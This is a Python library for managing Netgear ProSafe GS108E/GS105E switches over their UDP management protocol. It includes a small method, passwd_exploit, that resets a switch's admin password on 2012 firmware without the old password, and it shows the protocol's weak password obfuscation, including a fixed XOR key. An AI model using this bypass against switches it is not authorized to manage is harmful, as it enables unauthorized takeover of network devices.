#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"Main Class to communicate with gs108e and gs105e netgear switches"
import time
import binascii
import pprint
import random
import struct
import socket
import select
import fcntl
import psl_typ
import inspect
import errno


def get_hw_addr(ifname):
    "gives the hardware (mac) address of an interface (eth0,eth1..)"
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    ifname = ifname.encode('ascii')  # struct.pack requires bytes in Python 3
    info = fcntl.ioctl(sock.fileno(), 0x8927, struct.pack('256s', ifname[:15]))
    if type(info) is str:
        return ''.join(['%02x:' % ord(char) for char in info[18:24]])[:-1]
    else:
        # Python 3 returns a list of bytes from ioctl, no need for ord()
        return ''.join(['%02x:' % char for char in info[18:24]])[:-1]

def get_ip_address(ifname):
    "returns the first ip address of an interface"
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    ifname = ifname.encode('ascii')  # struct.pack requires bytes in Python 3
    try:
        # 0x8915 = SIOCGIFADDR
        addr = socket.inet_ntoa(fcntl.ioctl(sock.fileno(), 0x8915,
                                            struct.pack('256s',
                                            ifname[:15]))[20:24])
        return addr
    except IOError as err:
        if err.errno == errno.EADDRNOTAVAIL:
            return None
        raise

def pack_mac(value):
    "packs the hardware address (mac) to the internal representation"
    value = value.encode()  # binascii.unhexlify() requires bytes in Python 3
    if (len(value) == 17):
        return binascii.unhexlify(value[0:2] + value[3:5] + value[6:8] +
                                  value[9:11] + value[12:14] + value[15:17])
    if (len(value) == 12):
        return binascii.unhexlify(value)
    raise "unknown mac format=" + value


def unpack_mac(value):
    "unpack an internal representation to a hardware address"
    mac = binascii.hexlify(value)
    return (mac[0:2] + ":" + mac[2:4] + ":" + mac[4:6] + ":" + mac[6:8] +
            ":" + mac[8:10] + ":" + mac[10:12])


class ProSafeLinux:
    "Main class to communicate with a ProSafe gs108e gs105e Switch"
    CMD_MODEL = psl_typ.PslTypStringQueryOnly(0x0001, "model")
    CMD_FIMXE2 = psl_typ.PslTypHex(0x0002, "fixme2")
    CMD_NAME = psl_typ.PslTypString(0x0003, "name")
    CMD_MAC = psl_typ.PslTypMac(0x0004, "MAC")
    CMD_LOCATION = psl_typ.PslTypString(0x0005, "location")
    CMD_IP = psl_typ.PslTypIpv4(0x0006, "ip")
    CMD_NETMASK = psl_typ.PslTypIpv4(0x0007, "netmask")
    CMD_GATEWAY = psl_typ.PslTypIpv4(0x0008, "gateway")
    CMD_NEW_PASSWORD = psl_typ.PslTypHexNoQuery(0x0009, "new_password")
    CMD_PASSWORD = psl_typ.PslTypPassword(0x000a, "password", False)
    CMD_DHCP = psl_typ.PslTypDHCP(0x000b, "dhcp")
    CMD_FIXMEC = psl_typ.PslTypHex(0x000c, "fixmeC")
    CMD_FIRMWAREV = psl_typ.PslTypStringQueryOnly(0x000d, "firmwarever")
    CMD_FIRMWARE2V = psl_typ.PslTypStringQueryOnly(0x000e, "firmware2ver")
    CMD_FIRMWAREACTIVE = psl_typ.PslTypHex(0x000f, "firmware_active")
    CMD_REBOOT = psl_typ.PslTypAction(0x0013, "reboot")
    CMD_ENHANCEDENCRYPTION = psl_typ.PslTypHex(0x0014, "enhanced_encryption")
    CMD_PASSWORD_NONCE = psl_typ.PslTypHexNoQuery(0x0017, "password_nonce")
    CMD_PASSWORD_HASH = psl_typ.PslTypHexNoQuery(0x001a, "password_hash")
    CMD_FACTORY_RESET = psl_typ.PslTypAction(0x0400, "factory_reset")
    CMD_PORT_STATUS = psl_typ.PslTypPortStatus(0x0c00, "port_status")
    CMD_PORT_STAT = psl_typ.PslTypPortStat(0x1000, "port_stat")
    CMD_RESET_PORT_STAT = psl_typ.PslTypAction(0x1400, "reset_port_stat")
    CMD_TEST_CABLE = psl_typ.PslTypCableTest(0x1800, "test_cable")
    CMD_TEST_CABLE_RESULT = psl_typ.PslTypCableTestResult(0x1c00, "test_cable_result")
    CMD_VLAN_SUPPORT = psl_typ.PslTypVlanSupport(0x2000, "vlan_support")
    CMD_VLAN_ID = psl_typ.PslTypVlanId(0x2400, "vlan_id")
    CMD_VLAN802_ID = psl_typ.PslTypVlan802Id(0x2800, "vlan802_id")
    CMD_DEL_VLAN = psl_typ.PslTypDeleteVlan(0x2c00, "delete_vlan")
    CMD_VLANPVID = psl_typ.PslTypVlanPVID(0x3000, "vlan_pvid")
    CMD_QUALITY_OF_SERVICE = psl_typ.PslTypQosMode(0x3400, "qos_mode")
    CMD_PORT_BASED_QOS = psl_typ.PslTypPortBasedQOS(0x3800, "port_based_qos")
    CMD_BANDWIDTH_INCOMING_LIMIT = psl_typ.PslTypBandwidth(
                                              0x4c00, "bandwidth_in")
    CMD_BANDWIDTH_OUTGOING_LIMIT = psl_typ.PslTypBandwidth(
                                              0x5000, "bandwidth_out")
    CMD_BROADCAST_FILTERING = psl_typ.PslTypFiltering(0x5400, "broadcast_filtering")
    CMD_BROADCAST_BANDWIDTH = psl_typ.PslTypBandwidth(0x5800,
                 "broadcast_bandwidth")
    CMD_PORT_MIRROR = psl_typ.PslTypPortMirror(0x5c00, "port_mirror")
    CMD_NUMBER_OF_PORTS = psl_typ.PslTypHex(0x6000, "number_of_ports")
    CMD_IGMP_SNOOPING = psl_typ.PslTypIGMPSnooping(0x6800, "igmp_snooping")
    CMD_BLOCK_UNKNOWN_MULTICAST = psl_typ.PslTypBoolean(
                                              0x6c00, "block_unknown_multicast")
    CMD_IGMP_HEADER_VALIDATION = psl_typ.PslTypBoolean(0x7000,
        "igmp_header_validation")
    CMD_SUPPORTED_TLVS = psl_typ.PslTypHex(0x7400, "supported_tlvs")
    CMD_SERIAL_NUMBER = psl_typ.PslTypSerialNum(0x7800, "serial_number")
    CMD_LOOP_DETECTION = psl_typ.PslTypBoolean(0x9000, "loop_detection")
    CMD_PORT_ADMIN = psl_typ.PslTypAdminPortStatus(0x9400, "port_admin")
    CMD_END = psl_typ.PslTypEnd(0xffff, "END")

    ERR_SUCCESS = psl_typ.PslError(0x00, "Success")
    ERR_PROTO_NOT_SUPPORTED = psl_typ.PslError(0x01, "Protocol version not supported")
    ERR_CMD_NOT_SUPPORTED = psl_typ.PslError(0x02, "Command not supported")
    ERR_TLV_NOT_SUPPORTED = psl_typ.PslError(0x03, "TLV type not supported")
    ERR_BAD_TLV_LENGTH = psl_typ.PslError(0x04, "Invalid TLV length")
    ERR_BAD_TLV_VALUE = psl_typ.PslError(0x05, "Invalid TLV value")
    ERR_BLOCKED_BY_ACL = psl_typ.PslError(0x06, "Manager IP is blocked by ACL")
    ERR_BAD_PASSWORD = psl_typ.PslError(0x07, "Invalid password")
    ERR_FIRMWARE_DOWNLOAD_REQUESTED = psl_typ.PslError(0x08, "Firmware download requested")
    ERR_BAD_USERNAME = psl_typ.PslError(0x09, "Invalid username")
    ERR_MANAGE_BY_BROWSER = psl_typ.PslError(0x0a, "Switch only supports management by browser")
    ERR_INVALID_PASSWORD = psl_typ.PslError(0x0d, "Invalid password")
    ERR_LOCKED_30_MINS = psl_typ.PslError(0x0e, "3 failed attempts.  Switch is locked for 30 minutes")
    ERR_MANAGE_DISABLED = psl_typ.PslError(0x0f, "Switch management disabled.  Use browser to enable")
    ERR_TFTP_CALL = psl_typ.PslError(0x81, "TFTP call error")
    ERR_TFTP_OOM = psl_typ.PslError(0x82, "TFTP Out of memory")
    ERR_FIRMWARE_UPDATE_FAILED = psl_typ.PslError(0x83, "Firmware update failed")
    ERR_TFTP_TIMED_OUT = psl_typ.PslError(0x84, "TFTP timed out")

    CTYPE_QUERY_REQUEST = 0x0101
#    CTYPE_QUERY_RESPONSE = 0x0102
    CTYPE_TRANSMIT_REQUEST = 0x103
#    CTYPE_TRANSMIT_RESPONSE = 0x104

    ENCTYPE_NONE   = 0x00
    ENCTYPE_SIMPLE = 0x01
    ENCTYPE_HASH32 = 0x08
    ENCTYPE_HASH64 = 0x10

    RECPORT = 63321
    SENDPORT = 63322

    def __init__(self):
        "constructor"
        self.myhost = None
        self.srcmac = None
        self.ssocket = None
        self.brsocket = None
        self.ursocket = None
        self.timeout=2

        # i still see no win in randomizing the starting sequence...
        self.seq = random.randint(100, 2000)
        self.debug = False
        self.mac_cache = {}
        self.cmd_by_id = {}
        self.cmd_by_name = {}
        self.errmsgs = {}
        for key, value in  inspect.getmembers(ProSafeLinux):
            if key.startswith("CMD_"):
                self.cmd_by_name[value.get_name()] = value
                self.cmd_by_id[value.get_id()] = value

            if key.startswith("ERR_"):
                self.errmsgs[value.get_code()] = value

    def set_timeout(self, timeout):
        self.timeout=timeout

    def bind(self, interface):
        "bind to an interface"
        self.myhost = get_ip_address(interface)
        if not self.myhost:
            return False
        self.srcmac = pack_mac(get_hw_addr(interface))

        # send socket
        self.ssocket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.ssocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.ssocket.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        self.ssocket.bind((self.myhost, self.RECPORT))

        # broadcast receive socket
        self.brsocket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.brsocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        # self.brsocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
        self.brsocket.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        self.brsocket.bind(("255.255.255.255", self.RECPORT))

        # unicast receive socket
        self.ursocket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.ursocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        # self.ursocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
        self.ursocket.bind((self.myhost, self.RECPORT))

        return True

    def get_query_cmds(self):
        "return all commands which can be used in a query"
        rtn = []
        for cmd in list(self.cmd_by_name.values()):
            if cmd.is_queryable():
                rtn.append(cmd)
        return rtn

    def get_setable_cmds(self):
        "returns all commands which can be set"
        rtn = []
        for cmd in list(self.cmd_by_name.values()):
            if cmd.is_setable():
                rtn.append(cmd)
        return rtn

    def get_cmd_by_name(self, name):
        "return a command by its name"
        if name in self.cmd_by_name:
            return self.cmd_by_name[name]
        else:
            return None

    def get_cmd_by_hex(self, cmd_id):
        "return a command by its hex_value"
        if cmd_id in self.cmd_by_id:
            return self.cmd_by_id[cmd_id]
        else:
            return False


    def set_debug_output(self):
        "set debugging"
        self.debug = True

    def recv(self, maxlen=8192, sock=None):
        "receive a packet from the switch"
        socks = [sock];
        if sock is None:
            socks = [self.brsocket, self.ursocket]

        try:
            rsocks,_,_ = select.select(socks, [], [], self.timeout)
            if rsocks == []:
                return (None, None)

            message, address = rsocks[0].recvfrom(maxlen)

        except socket.timeout:
            return (None, None)
        except socket.error as error:
            # according to the Python documentation this error
            # is system-specifc; this works on Linux
            if error.errno == errno.EAGAIN:
                return (None, None)
            raise
        if self.debug:
            message_hex = binascii.hexlify(message).decode()
            print("recv=" + message_hex)
        return (message, address)

    def recv_all(self):
        "receive all pending packets"
        while True:
            (message, address) = self.recv()
            if message is None:
                return (None, address)
            return (message, address)

    def parse_data(self, pack):
        "unpack packet send by the switch"
        if pack == None:
            return False
        data = {}
        status = struct.unpack(">B", pack[2:3])[0]
        if status != 0x00:
            errorcmd = self.get_cmd_by_hex(struct.unpack(">H", pack[4:6])[0])

            if status in self.errmsgs:
                errorobj = self.errmsgs[status]
            else:
                errorobj = psl_typ.PslError(status, "Unknown error - 0x{:02x}".format(status))

            if errorcmd:
                data["error"] = errorcmd.get_name()
            else:
                data["error"] = struct.unpack(">H", pack[4:6])[0]

            data["error"] = "{} - {}".format(data["error"], errorobj.get_desc())
            data["error_obj"] = errorobj
        else:
#            data["seq"] = struct.unpack(">H", pack[22:24])[0]
#            data["ctype"] = struct.unpack(">H", pack[0:2])[0]
#            data["mymac"] = binascii.hexlify(pack[8:14])
#            data["theirmac"] = binascii.hexlify(pack[14:20]).decode()
            pos = 32
            cmd_id = 0
            while (pos<len(pack)):
                if self.debug:
                    print("pos:%d len: %d" %(pos,len(pack)))
                cmd_id = struct.unpack(">H", pack[pos:(pos + 2)])[0]
                if self.get_cmd_by_hex(cmd_id):
                    cmd = self.get_cmd_by_hex(cmd_id)
                else:
                    # we don't need a switch for "unknown_warn" here...let the client handle unknown responses
#                    print("Unknown Response %d" % cmd_id)
                    cmd = psl_typ.PslTypUnknown(cmd_id, "UNKNOWN %d" % cmd_id)
                pos = pos + 2
                cmdlen = struct.unpack(">H", pack[pos:(pos + 2)])[0]
                pos = pos + 2
                if cmdlen > 0:
                        value = cmd.unpack_cmd(pack[pos:(pos + cmdlen)])
                else:
                    value = None
                if cmd in data and value != None:
                    if type(data[cmd]) != type(list()):
                        data[cmd] = [data[cmd]]
                    data[cmd].append(value)
                elif value != None:
                    data[cmd] = value
                if self.debug:
                    print("cmd_id %d of length %d :" % (cmd_id, cmdlen))
                    data_hex = binascii.hexlify(pack[pos:(pos + cmdlen)]).decode()
                    print("data=" + data_hex)
                pos = pos + cmdlen
        return data

    def send(self, host, port, data):
        "send data to host on port"
        if self.debug:
            # binascii.unhexlify() requires bytes in Python 3
            data_hex = binascii.hexlify(data).decode()
            print("send to ip " + host + " data = " + data_hex)
        self.ssocket.sendto(data, (host, port))
        self.seq += 1

    def baseudp(self, ctype, destmac):
        "Base UDP Package"
        reserved = b"\x00"
        if destmac is None:
            destmac = 6 * b"\x00"
        if len(destmac) > 6:
            destmac = pack_mac(destmac)
        data = (struct.pack(">h", ctype) + 6 * reserved + self.srcmac +
                     destmac + 2 * reserved)
        data += struct.pack(">h", self.seq)
        data += b"NSDP" + 4 * reserved
        return data

    @staticmethod
    def addudp(cmd, datain=None):
        "Additional data to the base package"
        data = struct.pack(">H", cmd.get_id())
        if (datain is None):
            data += struct.pack(">H", 0)
        else:
            pdata = cmd.pack_py(datain)
            data += struct.pack(">H", len(pdata))
            data += pdata
        return data

    def ip_from_mac(self, mac):
        "query for the ip of a switch with a given mac address"
        if mac is None:
            return "255.255.255.255"
        if mac in self.mac_cache:
            return self.mac_cache[mac]
        # FIXME: Search in /proc/net/arp if mac there use this one
        #with open("/proc/net/arp") as f:
        # for line in f:
        #   print line
        query_arr = [self.CMD_MAC, self.CMD_IP]
        message, address = self.query(query_arr, mac, with_address=True, use_ip_func=False)
        if message == None:
            # try once more
            message, address = self.query(query_arr, mac, with_address=True, use_ip_func=False)
        if message != None and message != False:
            if self.CMD_MAC in message:
                if message[self.CMD_MAC].capitalize() == mac.capitalize():
                    if self.CMD_IP in message:
                        self.mac_cache[message[self.CMD_MAC]] = message[self.CMD_IP]
                    return address[0]
        return "255.255.255.255"

    def send_query(self, cmd_arr, mac, use_ip_func=True):
        "request some values from a switch, without changing them"
        if use_ip_func:
            ipadr = self.ip_from_mac(mac)
        else:
            ipadr = "255.255.255.255"
        data = self.baseudp(destmac=mac, ctype=self.CTYPE_QUERY_REQUEST)
        for cmd in cmd_arr:
            data += self.addudp(cmd)
        data += self.addudp(self.CMD_END)
        self.send(ipadr, self.SENDPORT, data)

    def query(self, cmd_arr, mac, with_address=False, use_ip_func=True):
        "get some values from the switch, but do not change them"
        # translate non-list to list
        if type(cmd_arr).__name__ != 'tupe' and type(cmd_arr).__name__ != 'list':
            cmd_arr = (cmd_arr, )
        self.send_query(cmd_arr, mac, use_ip_func)
        message, address = self.recv_all()
        if with_address:
            return (self.parse_data(message), address)
        else:
            return self.parse_data(message)

    def transmit(self, cmddict, mac):
        "change something in the switch, like name, mac ..."
        transmit_counter = 0
        ipadr = self.ip_from_mac(mac)
        data = b''

        if type(cmddict).__name__ == 'dict':
            for cmd, pdata in list(cmddict.items()):
                if cmd == self.CMD_PASSWORD:
                    result = self.add_password(mac, cmddict[cmd])

                    if type(result).__name__ == 'dict':
                        return result

                    data += result;
                elif cmd == self.CMD_NEW_PASSWORD:
                    result = self.add_new_password(mac, cmddict[cmd])

                    if type(result).__name__ == 'dict':
                        return result

                    data += result;
                else:
                    if type(pdata).__name__ == 'list' and cmd.allow_multiple():
                        for entry in pdata:
                            if cmd.get_num_args() == 1:
                                # Get single arguments out of a list (of one)
                                data += self.addudp(cmd, entry[0])
                            else:
                                data += self.addudp(cmd, entry)
                    else:
                        data += self.addudp(cmd, pdata)
        elif type(cmddict).__name__ == 'string':
            print('got string!')
            data += cmddict
        data += self.addudp(self.CMD_END)

        header = self.baseudp(destmac=mac, ctype=self.CTYPE_TRANSMIT_REQUEST)
        data = header + data

        self.send(ipadr, self.SENDPORT, data)
        message, address = self.recv_all()
        while message == None and transmit_counter < 3:
            time.sleep(1)
            message, address = self.recv_all()
            transmit_counter += 1
        if message == None:
            return { 'error' : 'no result received within 3 seconds' }
        return self.parse_data(message)

    def add_password(self, mac, password):
        "Add password to UDP data sent to the switch"

        data = None;

        # Find out what the switch supports
        enc = self.query(self.CMD_ENHANCEDENCRYPTION, mac)

        if enc == False:
            enc = self.ENCTYPE_NONE
        else:
            enc = int(enc[self.CMD_ENHANCEDENCRYPTION], 16)

        if enc == self.ENCTYPE_NONE:
            # No encryption - just plaintext
            data = self.addudp(self.CMD_PASSWORD, password)
        elif enc == self.ENCTYPE_SIMPLE:
            # Simple fixed XOR
            _hashkey = "NtgrSmartSwitchRock"
            _hashpass = ""
            for i in range(len(password)):
                _hashpass += chr(ord(password[i]) ^ ord(_hashkey[i]))
            data = self.addudp(self.CMD_PASSWORD, _hashpass)
        elif enc == self.ENCTYPE_HASH32 or enc == self.ENCTYPE_HASH64:
            nonce = self.query(self.CMD_PASSWORD_NONCE, mac)
            if nonce == False:
                return { 'error' : 'Could not get nonce from switch' }

            # Jump through hoops to convert a hex string to an indexable
            # group of bytes that works on Python2 and Python3
            nonce = bytearray(binascii.unhexlify(nonce[self.CMD_PASSWORD_NONCE]));

            _mac = mac
            if len(_mac) > 6:
                _mac = bytearray(pack_mac(_mac))

            _hashpass = [_mac[1] ^ _mac[5],
                         _mac[0] ^ _mac[4],
                         _mac[2] ^ _mac[3],
                         _mac[4] ^ _mac[5]]

            _hashpass[0] ^= nonce[3] ^ nonce[2]
            _hashpass[1] ^= nonce[3] ^ nonce[1]
            _hashpass[2] ^= nonce[0] ^ nonce[2]
            _hashpass[3] ^= nonce[0] ^ nonce[1]

            if enc == self.ENCTYPE_HASH32:
                for i in range(min(len(password),16)):
                    if (i < 4) or (i > 7):
                        idx = ((i + 3) % 4)
                        idx = ((i + 3) % 4)
                        idx ^= (idx // 2)
                    else:
                        idx = 3 - (i % 4)

                    _hashpass[idx] ^= ord(password[i])

                _hashpass = struct.pack(">BBBB", *_hashpass)
                data = self.addudp(self.CMD_PASSWORD_HASH, binascii.hexlify(_hashpass))
            else:
                _hashpass += _hashpass;

                _hashpass[6] ^= ord(password[0])

                for i in range(len(password)):
                    _hashpass[i // 3] ^= ord(password[i])

                    if (i < 6) and (i % 2):
                        _hashpass[7] ^= ord(password[i])

                _hashpass = struct.pack(">BBBBBBBB", *_hashpass)
                data = self.addudp(self.CMD_PASSWORD_HASH, binascii.hexlify(_hashpass))
        else:
            return { 'error' : 'Unknown encryption type 0x%02x' % enc }

        return data

    def add_new_password(self, mac, password):
        "Add new password to UDP data sent to the switch"

        data = None;

        # Find out what the switch supports
        enc = self.query(self.CMD_ENHANCEDENCRYPTION, mac)

        if enc == False:
            enc = self.ENCTYPE_NONE
        else:
            enc = int(enc[self.CMD_ENHANCEDENCRYPTION], 16)

        if enc == self.ENCTYPE_NONE or enc == self.ENCTYPE_SIMPLE:
            # No encryption - just plaintext
            data = self.addudp(self.CMD_PASSWORD, password)
        elif enc == self.ENCTYPE_SIMPLE:
            # Simple fixed XOR
            _hashkey = "NtgrSmartSwitchRock"
            _hashpass = ""
            for i in range(len(password)):
                _hashpass += chr(ord(password[i]) ^ ord(_hashkey[i]))
            data = self.addudp(self.CMD_PASSWORD, _hashpass)
        elif enc == self.ENCTYPE_HASH32:
            return { 'error' : 'Unsupported encryption type 0x%02x' % enc }
        elif enc == self.ENCTYPE_HASH64:
            nonce = self.query(self.CMD_PASSWORD_NONCE, mac)
            if nonce == False:
                return { 'error' : 'Could not get nonce from switch' }

            # Jump through hoops to convert a hex string to an indexable
            # group of bytes that works on Python2 and Python3
            nonce = bytearray(binascii.unhexlify(nonce[self.CMD_PASSWORD_NONCE]));

            _mac = mac
            if len(_mac) > 6:
                _mac = bytearray(pack_mac(_mac))

            _hashpass = [_mac[1] ^ _mac[5],
                         _mac[0] ^ _mac[4],
                         _mac[2] ^ _mac[3],
                         _mac[4] ^ _mac[5]]

            _hashpass[0] ^= nonce[3] ^ nonce[2]
            _hashpass[1] ^= nonce[3] ^ nonce[1]
            _hashpass[2] ^= nonce[0] ^ nonce[2]
            _hashpass[3] ^= nonce[0] ^ nonce[1]

            if enc == self.ENCTYPE_HASH32:
                for i in range(min(len(password),16)):
                    if (i < 4) or (i > 7):
                        idx = ((i + 3) % 4)
                        idx = ((i + 3) % 4)
                        idx ^= (idx // 2)
                    else:
                        idx = 3 - (i % 4)

                    _hashpass[idx] ^= ord(password[i])

                _hashpass = struct.pack(">BBBB", *_hashpass)
                data = self.addudp(self.CMD_HASH, binascii.hexlify(_hashpass))
            else:

                _hashpass += _hashpass;

                _hashpass[6] ^= ord(password[0])

                for i in range(len(password)):
                    _hashpass[i // 3] ^= ord(password[i])

                    if (i < 6) and (i % 2):
                        _hashpass[7] ^= ord(password[i])

                _hashpass = struct.pack(">BBBBBBBB", *_hashpass)
                data = self.addudp(self.CMD_PASSWORD_HASH, binascii.hexlify(_hashpass))
        else:
            return { 'error' : 'Unknown encryption type 0x%02x' % enc }

        return data

    def passwd_exploit(self, mac, new):
        "exploit in current (2012) firmware version, set a new password"
        # The order of the CMD_PASSWORD and CMD_NEW_PASSWORD is important
        data = self.addudp(self.CMD_NEW_PASSWORD, new)
        data += self.addudp(self.CMD_PASSWORD, new)
        return self.transmit(data, mac)

    def discover(self):
        "find any switch in the network"
        query_arr = [self.CMD_MODEL,
                   self.CMD_NAME,
                   self.CMD_MAC,
                   self.CMD_DHCP,
                   self.CMD_IP]
        message = self.query(query_arr, None)
        if message != False:
            self.mac_cache[message[self.CMD_MAC]] = message[self.CMD_IP]
        return message

    def verify_data(self, datadict):
        "Verify the data we want to set on the switch"
        errors = []
        if ProSafeLinux.CMD_DHCP in datadict:
            if datadict[ProSafeLinux.CMD_DHCP]:
                if ((ProSafeLinux.CMD_IP in datadict) or
                    (ProSafeLinux.CMD_GATEWAY in datadict) or
                    (ProSafeLinux.CMD_NETMASK in datadict)):
                    errors.append("When dhcp=on, no ip,gateway nor netmask is allowed")
            else:
                if (not((ProSafeLinux.CMD_IP in datadict) and
                  (ProSafeLinux.CMD_GATEWAY in datadict) and
                  (ProSafeLinux.CMD_NETMASK in datadict))):
                    errors.append("When dhcp=off, specify ip,gateway and netmask")
        else:
            if ((ProSafeLinux.CMD_IP in datadict) or
              (ProSafeLinux.CMD_GATEWAY in datadict) or
              (ProSafeLinux.CMD_NETMASK in datadict)):
                errors.append("Use dhcp off,ip,gateway and netmask option together")

        if len(errors) > 0:
            return (False, errors)
        else:
            return (True, None)
